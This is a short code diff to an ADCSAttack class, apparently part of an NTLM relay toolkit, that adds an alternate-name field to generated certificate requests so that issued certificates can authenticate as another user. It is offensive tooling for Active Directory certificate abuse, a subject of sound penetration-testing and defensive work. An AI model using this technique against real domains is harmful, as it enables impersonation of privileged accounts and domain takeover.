@@ -32,7 +32,7 @@ class ADCSAttack:
         if self.username in ELEVATED:
             LOG.info('Skipping user %s since attack was already performed' % self.username)
             return
-        csr = self.generate_csr(key, self.username)
+        csr = self.generate_csr(key, self.username, self.config.altName)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         LOG.info("CSR generated!")
 
@@ -72,9 +72,11 @@ class ADCSAttack:
 
         certificate_store = self.generate_pfx(key, certificate)
         LOG.info("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
-        LOG.info("This certificate can also be used for user : {}".format(self.config.altName)
 
-    def generate_csr(self, key, CN):
+        if self.config.altName:
+            LOG.info("This certificate can also be used for user : {}".format(self.config.altName))
+
+    def generate_csr(self, key, CN, altName):
         LOG.info("Generating CSR...")
         req = crypto.X509Req()
         req.get_subject().CN = CN
